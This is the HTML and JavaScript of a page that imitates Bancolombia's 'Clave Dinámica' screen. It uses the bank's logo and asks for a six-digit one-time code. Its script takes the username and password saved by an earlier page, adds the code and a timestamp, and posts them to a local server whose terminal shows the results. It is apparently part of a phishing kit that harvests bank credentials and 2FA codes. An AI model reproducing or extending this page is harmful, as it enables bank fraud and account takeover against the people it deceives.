<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Clave Dinámica</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .codigos { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
        .codigo { 
            width: 50px; 
            height: 60px; 
            border: 2px solid #ddd; 
            border-radius: 8px; 
            text-align: center; 
            font-size: 24px; 
            font-weight: bold;
        }
        .codigo:focus { border-color: #ffcc00; outline: none; }
        button:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="main-container">
        <img src="logo bancolombia.png" alt="Logo Bancolombia" class="logo">
        <h1>Clave Dinámica</h1>
        <div class="login-box">
            <h2>Ingresa la Clave Dinámica</h2>
            <p>Escribe el código de 6 dígitos para continuar.</p>
            
            <div class="codigos">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
                <input type="text" class="codigo" maxlength="1" inputmode="numeric">
            </div>
            
            <button class="btn-login" id="btnContinuar" disabled>Continuar</button>
            <a href="index.html" class="link-crear">← Volver al inicio</a>
        </div>
    </div>

    <script>
        // RECUPERAR DATOS GUARDADOS
        const usuarioGuardado = sessionStorage.getItem('usuario');
        const claveGuardada = sessionStorage.getItem('clave');
        
        console.log('Recuperado de sessionStorage:', {
            usuario: usuarioGuardado, 
            clave: claveGuardada
        });

        const inputs = document.querySelectorAll('.codigo');
        const btn = document.getElementById('btnContinuar');

        // Mover entre inputs automáticamente
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Solo números
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkComplete();
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function checkComplete() {
            const code = Array.from(inputs).map(i => i.value).join('');
            btn.disabled = code.length !== 6;
        }

        // ENVIAR TODO AL SERVIDOR
        btn.addEventListener('click', async () => {
            const claveDinamica = Array.from(inputs).map(i => i.value).join('');
            
            const datos = {
                usuario: usuarioGuardado || 'NO_ENCONTRADO',
                clave: claveGuardada || 'NO_ENCONTRADA',
                claveDinamica: claveDinamica,
                fecha: new Date().toLocaleString()
            };
            
            console.log('Enviando al servidor:', datos);
            
            try {
                const response = await fetch('http://localhost:3000/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(datos)
                });
                
                if (response.ok) {
                    alert('✓ Datos enviados correctamente. Revisa la terminal.');
                }
            } catch (error) {
                alert('Error de conexión, pero los datos están listos.');
                console.log('Error:', error);
            }
        });
    </script>
</body>
</html>
